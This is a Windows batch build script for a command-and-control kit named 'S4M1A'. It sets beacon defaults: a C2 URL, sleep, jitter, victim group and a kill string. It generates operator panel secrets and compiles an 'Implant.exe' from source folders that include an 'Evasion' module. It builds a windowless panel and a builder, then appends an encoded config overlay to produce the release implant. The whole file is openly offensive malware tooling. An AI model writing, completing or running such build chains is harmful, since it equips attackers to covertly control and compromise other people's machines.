@echo off
setlocal enabledelayedexpansion
title S4M1A Build v2.0
cd /d "%~dp0.."
set "ROOT=%CD%"

echo ============================================================
echo   S4M1A Build v2.0
echo ============================================================

:: ---------- 0) Settings (override via environment variables) ----------
if "%S4M1A_C2%"=="" set "S4M1A_C2=https://127.0.0.1:8443"
if "%S4M1A_SLEEP%"=="" set "S4M1A_SLEEP=5000"
if "%S4M1A_JITTER%"=="" set "S4M1A_JITTER=25"
if "%S4M1A_GROUP%"=="" set "S4M1A_GROUP=workstation"
if "%S4M1A_KILL%"=="" set "S4M1A_KILL=K1LLALL2026"

:: ---------- 1) Generate panel secrets if missing ----------
if not exist "%ROOT%\panel_secrets.json" (
    echo [*] panel_secrets.json missing - running keygen...
    python "%ROOT%\tools\keygen.py" "%ROOT%"
    if errorlevel 1 goto fail
)

:: ---------- 2) Generate config if missing ----------
if not exist "%ROOT%\dist\config.bin" (
    echo [*] config.bin missing - running makeconfig...
    python "%ROOT%\tools\makeconfig.py" --root "%ROOT%" --c2 "%S4M1A_C2%" ^
        --sleep %S4M1A_SLEEP% --jitter %S4M1A_JITTER% --group "%S4M1A_GROUP%" --kill "%S4M1A_KILL%"
    if errorlevel 1 goto fail
) else (
    echo [*] config.bin exists - regenerate manually with: python tools\makeconfig.py --force
)

:: ---------- 3) Locate compiler ----------
set "CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC%" set "CSC=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
if not exist "%CSC%" (
    echo [!] csc.exe not found - install .NET Framework 4.x
    goto fail
)

set "REFS=/r:System.dll /r:System.Core.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll /r:System.Net.dll /r:System.Xml.dll /r:System.Management.dll /r:System.Web.Extensions.dll /r:System.Runtime.Serialization.dll"
set "FLAGS=/nologo /optimize+ /unsafe /target:exe /platform:anycpu"
set "FLAGS_WINEXE=/nologo /optimize+ /unsafe /target:winexe /platform:anycpu"

set "ICON="
if exist "%ROOT%\resources\icon.ico" set "ICON=/win32icon:%ROOT%\resources\icon.ico"

if not exist "%ROOT%\bin" mkdir "%ROOT%\bin"
if not exist "%ROOT%\release" mkdir "%ROOT%\release"

:: ---------- 4) Compile implant ----------
echo [*] Compiling Implant.exe ...
"%CSC%" %FLAGS% %REFS% %ICON% /out:"%ROOT%\bin\Implant.exe" ^
    "%ROOT%\src\Implant\*.cs" ^
    "%ROOT%\src\Implant\Evasion\*.cs" ^
    "%ROOT%\src\Implant\Modules\*.cs"
if errorlevel 1 goto fail

:: ---------- 5) Compile panel (optional) ----------
if exist "%ROOT%\src\Panel\Panel.cs" (
    echo [*] Compiling Panel.exe winexe - no console window ...
    "%CSC%" %FLAGS_WINEXE% %REFS% %ICON% /out:"%ROOT%\bin\Panel.exe" "%ROOT%\src\Panel\*.cs"
    if errorlevel 1 goto fail
)

:: ---------- 6) Compile builder (optional) ----------
if exist "%ROOT%\src\Builder\Builder.cs" (
    echo [*] Compiling Builder.exe ...
    "%CSC%" %FLAGS% %REFS% %ICON% /out:"%ROOT%\bin\Builder.exe" "%ROOT%\src\Builder\*.cs"
    if errorlevel 1 goto fail
)

:: ---------- 7) Append config overlay ----------
echo [*] Appending config overlay ...
copy /b /y "%ROOT%\bin\Implant.exe" + "%ROOT%\dist\config.bin" "%ROOT%\release\S4M1A_Implant.exe" >nul
if errorlevel 1 goto fail

echo.
echo ============================================================
echo   [OK] Build finished successfully
echo   [+] Implant : "%ROOT%\release\S4M1A_Implant.exe"
echo   [+] Panel   : "%ROOT%\bin\Panel.exe"
echo   [+] Builder : "%ROOT%\bin\Builder.exe"
echo ============================================================
echo.
echo NOTE: overlay requires running the implant from a file on disk
echo (executing from memory does not include the appended config).
exit /b 0

:fail
echo.
echo [!] Build failed - review errors above.
exit /b 1